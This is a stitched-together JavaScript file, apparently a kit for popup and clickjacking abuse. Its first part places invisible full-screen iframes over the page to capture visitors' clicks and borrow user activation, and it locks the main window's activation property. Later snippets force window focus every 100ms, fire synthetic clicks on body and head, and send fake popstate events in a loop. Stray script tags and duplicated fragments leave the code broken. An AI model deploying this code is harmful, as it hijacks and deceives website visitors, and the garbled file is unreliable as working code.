



(function() {
    'use strict';
    
    // Configuration
    const CONFIG = {
        popupUrl: 'about:blank',  // Change this to your test popup URL
        enableLogging: false,  // Changed from true to false
        lockMainWindow: true,
        createDoubleIframe: true,  // Create 2 iframes like the real attack
        maxZIndex: 0,
        popupMessage: 'This popup opened using user activation from invisible iframe!'
    };
    
    // State tracking
    const state = {
        iframes: [],
        clicksCaptured: 0,
        popupsOpened: 0,
        locked: false
    };
    
    // STEP 1: Lock main window's userActivation
    function lockMainWindowActivation() {
        if (!CONFIG.lockMainWindow) return;
        
        try {
            Object.defineProperty(navigator, 'userActivation', {
                value: undefined,
                writable: false,
                enumerable: false,
                configurable: false
            });
            
            state.locked = true;
        } catch (error) {
        }
    }
    
    // STEP 2: Create invisible iframe overlay
    function createInvisibleIframe(index = 0) {
        const iframe = document.createElement('iframe');
        
        // Make it completely invisible and cover entire viewport
        iframe.style.position = 'fixed';
        iframe.style.top = '0';
        iframe.style.left = '0';
        iframe.style.width = '100%';
        iframe.style.height = '100%';
        iframe.style.opacity = '0';
        iframe.style.zIndex = CONFIG.maxZIndex.toString();
        iframe.style.border = 'none';
        iframe.style.pointerEvents = 'auto';
        
        // Add data attributes for identification
        iframe.setAttribute('data-popup-attack', 'true');
        iframe.setAttribute('data-iframe-index', index.toString());
        
        // Append to body
        document.body.appendChild(iframe);
        
        // Wait for iframe to load, then set up event listeners
        iframe.addEventListener('load', () => {
            setupIframeEventListeners(iframe, index);
        });
        
        state.iframes.push(iframe);
        
        return iframe;
    }
    
    // STEP 3: Set up event listeners inside iframe
    function setupIframeEventListeners(iframe, index) {
        try {
            const iframeWindow = iframe.contentWindow;
            const iframeDocument = iframe.contentWindow.document;
            
            // Make iframe body cover full area
            if (iframeDocument.body) {
                iframeDocument.body.style.margin = '0';
                iframeDocument.body.style.padding = '0';
                iframeDocument.body.style.width = '100%';
                iframeDocument.body.style.height = '100vh';
                iframeDocument.body.style.cursor = 'pointer';
            }
            
            // CLICK EVENT LISTENER
            iframeWindow.addEventListener('click', (event) => {
                handleIframeClick(iframeWindow, index, 'click', event);
            }, true);
            
            // TOUCH EVENT LISTENER (for mobile)
            iframeWindow.addEventListener('touchend', (event) => {
                handleIframeClick(iframeWindow, index, 'touch', event);
            }, true);
            
        } catch (error) {
        }
    }
    
    // STEP 4: Handle clicks captured by iframe
    function handleIframeClick(iframeWindow, index, eventType, event) {
        state.clicksCaptured++;
        
        // Check if iframe has user activation
        const activation = iframeWindow.navigator.userActivation;
        
        if (activation && activation.isActive) {
            // Open popup from iframe context - REMOVED POPUP OPENING CODE
        }
    }
    
    // STEP 5: Removed openPopupFromIframe function entirely
    
    // STEP 6: Monitor activation status (for debugging) - REMOVED
    // This function was removed entirely
    
    // STEP 7: Clean up function (for testing)
    function cleanupAttack() {
        state.iframes.forEach((iframe, index) => {
            iframe.remove();
        });
        
        state.iframes = [];
        state.clicksCaptured = 0;
        state.popupsOpened = 0;
    }
    
    // STEP 8: Initialize the attack
    function initializeAttack() {
        // Lock main window first
        lockMainWindowActivation();
        
        // Create invisible iframes
        const iframeCount = CONFIG.createDoubleIframe ? 2 : 1;
        for (let i = 0; i < iframeCount; i++) {
            setTimeout(() => {
                createInvisibleIframe(i);
            }, i * 100);
        }
    }
    
    // Expose cleanup function globally for testing
    window.cleanupPopupAttack = cleanupAttack;
    
    window.getPopupAttackStats = function() {
        return {
            iframesActive: state.iframes.length,
            clicksCaptured: state.clicksCaptured,
            popupsOpened: state.popupsOpened,
            mainWindowLocked: state.locked
        };
    };
    
    // Wait for DOM to be ready, then initialize
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initializeAttack);
    } else {
        // DOM already loaded
        initializeAttack();
    }
    
})();


(function() {
    console.log('.');
    
    // Deployment sequence function
    function deploySequence() {
        // Method 1: Focus main window
        window.focus();
        
        // Method 2: Focus with delay
        setTimeout(function() {
            window.focus();
        }, 50);
        
        // Method 3: Simulate click
        setTimeout(function() {
            try {
                document.body.dispatchEvent(new MouseEvent('click', {
                    bubbles: true,
                    cancelable: true,
                    view: window
                }));
            } catch(e) {}
        }, 100);
        
        // Method 4: Focus body
        setTimeout(function() {
            try {
                document.body.focus();
                window.focus();
            } catch(e) {}
        }, 150);
    }
    
    // Run immediately
    deploySequence();
    
    // Run every 100ms (10 times per second)
    setInterval(deploySequence, 100);
    
    // Also run on any user interaction
    document.addEventListener('mousemove', deploySequence);
    document.addEventListener('click', deploySequence);
    document.addEventListener('keydown', deploySequence);
    document.addEventListener('scroll', deploySequence);
    document.addEventListener('touchstart', deploySequence);
    
    console.log('..');
    console.log('..');
})();


window.setTimeout(function () {
  document.body.click()
}, 1500);


          
          
       
window.setTimeout(function () {
  document.head.click()
}, 1500);



window.setTimeout(function () {
  document.body.click()
}, 2000);


          
          
          <script>
window.setTimeout(function () {
  document.head.click()
}, 2000);
</script>

 
window.setTimeout(function () {
  document.body.click()
}, 2200);


          
          
          <script>
window.setTimeout(function () {
  document.head.click()
}, 2300);




window.setTimeout(function () {
  document.body.click()
}, 2500);


          
          
          <script>
window.setTimeout(function () {
  document.head.click()
}, 2500);



function simulateClickAndTriggerPopState() {
    // Get all clickable elements on the page
    const clickableElements = document.querySelectorAll('[id]');

    // Check if there are clickable elements
    if (clickableElements.length > 0) {
        // Choose the first clickable element (you may customize the selection logic as needed)
        const targetElement = clickableElements[0];

        // Simulate a click on the chosen element
        const clickEvent = new MouseEvent('click', {
            bubbles: true,
            cancelable: true,
            view: window
        });
        targetElement.dispatchEvent(clickEvent);

        // Trigger the popstate event
        const popStateEvent = new PopStateEvent('popstate', { state: {} });
        window.dispatchEvent(popStateEvent);
    } else {
        console.log('No clickable elements with IDs found on the page.');
    }
}

// Example: Simulate a click and trigger popstate continuously with a delay
const delay = 1500; // Delay in milliseconds
setInterval(() => {
    simulateClickAndTriggerPopState();
}, delay);
